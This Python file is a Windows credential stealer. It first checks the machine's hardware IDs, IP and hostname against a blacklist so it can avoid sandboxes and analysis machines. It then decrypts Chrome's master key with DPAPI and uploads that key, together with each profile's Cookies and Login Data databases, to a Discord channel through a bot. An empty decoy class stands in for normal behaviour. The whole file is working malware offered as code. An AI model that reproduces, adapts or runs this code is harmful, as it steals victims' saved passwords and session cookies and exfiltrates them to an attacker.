import wmi, socket, os, discord, re, subprocess, requests, uuid, win32crypt, json, base64, sys

try:
    enable = True
    checker = True
    debug = False
    
    token = '.'
    USER_CHANNEL_ID = 123

    def get_motherboard_serial():
        try:
            c = wmi.WMI()
            for board in c.Win32_BaseBoard():
                return board.SerialNumber.strip()
        except Exception as e:
            if debug: print(e)
            return 'Failed'

    def getip():
        try:
            ip = requests.get("https://api.ipify.org", timeout=5).text
        except requests.exceptions.Timeout:
            return 'Failed'
        except Exception as e:
            return 'Failed'
        return ip

    current_motherboard_id = str(get_motherboard_serial())
    current_ip = str(getip())
    current_mac = str(':'.join(re.findall('..', '%012x' % uuid.getnode())))
    current_wid = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip())
    current_bios_serial = str(subprocess.check_output('wmic bios get serialnumber').decode().split('\n')[1].strip())

    if checker == True:
        binary_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        blacklist_path = os.path.join(binary_path, 'blacklist.json')

        with open(blacklist_path, 'r') as file:
            data = json.load(file)

        motherboard_hwid = data['motherboard_hwid']
        device_id = data['device_id']
        ip = data['ip']
        mac = data['mac']
        hw_guid = data['hw_guid']
        machine_guid = data['machine_guid']
        bios = data['bios']
        
        def string_checker(string):
            getVals = list([val for val in string
                        if val.isalpha() or val.isnumeric()])
            result = "".join(getVals)
            return result.isdigit()

        if string_checker(socket.gethostname()) == True or string_checker(current_motherboard_id):
            enable = False

        if current_ip in ip:
            enable = False

        if current_bios_serial in bios:
            enable = False

        if current_mac in mac:
            enable = False

        if current_wid in hw_guid or current_wid in machine_guid:
            enable = False

        if current_motherboard_id in motherboard_hwid:
            enable = False

        if socket.gethostname() in device_id:
            enable = False

except Exception as e:
    enable = False
    if debug: print(e)
    pass


class Main:
    def __init__(self):
        pass

    def main(self):
        pass

if __name__ == '__main__':

    version = 'v1.0.1'

    USERNAME = socket.gethostname()

    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

    intents = discord.Intents.default()
    intents.message_content = True

    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]

    if enable == True:

        def ACCESS_KEY():
            try:
                with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                    LOCAL_STATE = f.read()
                    LOCAL_STATE = json.loads(LOCAL_STATE)
                SECRET_KEY = base64.b64decode(LOCAL_STATE["os_crypt"]["encrypted_key"])
                SECRET_KEY = SECRET_KEY[5:]
                SECRET_KEY = win32crypt.CryptUnprotectData(SECRET_KEY, None, None, None, 0)[1]
                return SECRET_KEY
            except Exception as e:
                return 'None'
    
        SECRET_KEY = ACCESS_KEY()

        try:
            class MyClient(discord.Client):
                def on_ready(self):
                    USER_CHANNEL = client.get_channel(USER_CHANNEL_ID)  
                    USER_CHANNEL.send(f"--------------------------------\nDevice Name: `{USERNAME}`\nKey: {SECRET_KEY}\nVersion: `{version}`")
                    for profile in folders:
                        file = []
                        try:
                            COOKIE_DB_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\%s\Network\Cookies" % (os.environ['USERPROFILE'], profile))
                            file.append(discord.File(COOKIE_DB_PATH))
                        except Exception as e:
                            if debug == True: print(e)
                            pass
                        LOGIN_DB_PATH = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,profile))
                        file.append(discord.File(LOGIN_DB_PATH))
                        USER_CHANNEL.send(f"Profile: `{profile}`", files=file)
                    client.close()
                    Main().main()

            client = MyClient(intents=intents)
            client.run(token, log_handler=None)

        except Exception as e:
            if debug == True: print(e)
            pass
    else:
        Main().main()